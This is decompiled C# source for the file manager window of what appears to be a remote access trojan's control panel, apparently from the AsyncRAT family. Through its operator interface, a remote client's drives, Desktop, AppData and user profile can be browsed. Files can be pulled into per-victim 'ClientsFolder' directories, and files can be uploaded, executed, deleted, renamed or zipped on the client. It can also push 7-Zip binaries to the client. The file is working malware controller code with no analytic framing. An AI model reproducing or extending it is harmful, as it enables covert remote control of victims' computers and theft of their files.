using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x0200009F RID: 159
	public partial class FormFileManager : Form
	{
		// Token: 0x170000BB RID: 187
		// (get) Token: 0x060004CF RID: 1231 RVA: 0x000048B9 File Offset: 0x00002AB9
		// (set) Token: 0x060004D0 RID: 1232 RVA: 0x000048C1 File Offset: 0x00002AC1
		public FormMain F { get; set; }

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x060004D1 RID: 1233 RVA: 0x000048CA File Offset: 0x00002ACA
		// (set) Token: 0x060004D2 RID: 1234 RVA: 0x000048D2 File Offset: 0x00002AD2
		internal Clients Client { get; set; }

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x060004D3 RID: 1235 RVA: 0x000048DB File Offset: 0x00002ADB
		// (set) Token: 0x060004D4 RID: 1236 RVA: 0x000048E3 File Offset: 0x00002AE3
		public string FullPath { get; set; }

		// Token: 0x060004D5 RID: 1237 RVA: 0x000048EC File Offset: 0x00002AEC
		public FormFileManager()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004D6 RID: 1238 RVA: 0x0003D904 File Offset: 0x0003BB04
		private void listView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
					this.listView1.Enabled = false;
					this.toolStripStatusLabel3.ForeColor = Color.Green;
					this.toolStripStatusLabel3.Text = "Please Wait";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004D7 RID: 1239 RVA: 0x0003D9DC File Offset: 0x0003BBDC
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.toolStripStatusLabel1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.toolStripStatusLabel1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[]
					{
						'\\'
					}, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x060004D8 RID: 1240 RVA: 0x0003DB54 File Offset: 0x0003BD54
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
					{
						Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
					}
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
						{
							break;
						}
						MsgPack msgPack = new MsgPack();
						string dwid = Guid.NewGuid().ToString();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "socketDownload";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("DWID").AsString = dwid;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						base.BeginInvoke(new MethodInvoker(delegate()
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
							{
								new FormDownloadFile
								{
									Name = "socketDownload:" + dwid,
									Text = "socketDownload:" + this.Client.ID,
									F = this.F,
									DirPath = this.FullPath
								}.Show();
							}
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004D9 RID: 1241 RVA: 0x0003DD10 File Offset: 0x0003BF10
		private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.toolStripStatusLabel1.Text.Length >= 3)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						foreach (string text in openFileDialog.FileNames)
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
							{
								FormDownloadFile formDownloadFile = new FormDownloadFile
								{
									Name = "socketUpload:" + Guid.NewGuid().ToString(),
									Text = "socketUpload:" + this.Client.ID,
									F = Program.form1,
									Client = this.Client
								};
								formDownloadFile.FileSize = new FileInfo(text).Length;
								formDownloadFile.labelfile.Text = Path.GetFileName(text);
								formDownloadFile.FullFileName = text;
								formDownloadFile.label1.Text = "Upload:";
								formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
								MsgPack msgPack = new MsgPack();
								msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
								formDownloadFile.Show();
								ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x060004DA RID: 1242 RVA: 0x0003DED8 File Offset: 0x0003C0D8
		private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "deleteFile";
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (listViewItem.ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
							msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004DB RID: 1243 RVA: 0x0003E064 File Offset: 0x0003C264
		private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.toolStripStatusLabel1.Text != "")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "getDrivers";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004DC RID: 1244 RVA: 0x0003E154 File Offset: 0x0003C354
		private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "execute";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004DD RID: 1245 RVA: 0x0003E238 File Offset: 0x0003C438
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060004DE RID: 1246 RVA: 0x0003E278 File Offset: 0x0003C478
		private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060004DF RID: 1247 RVA: 0x0003E2FC File Offset: 0x0003C4FC
		private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "APPDATA";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060004E0 RID: 1248 RVA: 0x0003E380 File Offset: 0x0003C580
		private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "createFolder";
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004E1 RID: 1249 RVA: 0x0003E440 File Offset: 0x0003C640
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "copy";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004E2 RID: 1250 RVA: 0x0003E558 File Offset: 0x0003C758
		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "pasteFile";
				msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060004E3 RID: 1251 RVA: 0x0003E5E4 File Offset: 0x0003C7E4
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 1)
			{
				try
				{
					string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
					if (!string.IsNullOrEmpty(text))
					{
						if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "renameFile";
							msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (this.listView1.SelectedItems[0].ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "renameFolder";
							msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
							msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x060004E4 RID: 1252 RVA: 0x0003E804 File Offset: 0x0003CA04
		private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "USER";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060004E5 RID: 1253 RVA: 0x0003E888 File Offset: 0x0003CA88
		private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getDrivers";
			this.toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060004E6 RID: 1254 RVA: 0x0003E8F4 File Offset: 0x0003CAF4
		private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Process.Start(this.FullPath);
			}
			catch
			{
			}
		}

		// Token: 0x060004E7 RID: 1255 RVA: 0x000048FA File Offset: 0x00002AFA
		private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x060004E8 RID: 1256 RVA: 0x0003E93C File Offset: 0x0003CB3C
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "cut";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004E9 RID: 1257 RVA: 0x0003EA54 File Offset: 0x0003CC54
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "zip";
					msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("Zip").AsString = "true";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004EA RID: 1258 RVA: 0x0003EB6C File Offset: 0x0003CD6C
		private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "zip";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("Zip").AsString = "false";
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004EB RID: 1259 RVA: 0x0003EC68 File Offset: 0x0003CE68
		private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "installZip";
			msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
			msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060004EC RID: 1260 RVA: 0x0003D9DC File Offset: 0x0003BBDC
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.toolStripStatusLabel1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.toolStripStatusLabel1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[]
					{
						'\\'
					}, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x060004ED RID: 1261 RVA: 0x0003E278 File Offset: 0x0003C478
		private void guna2Button1_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}
	}
}
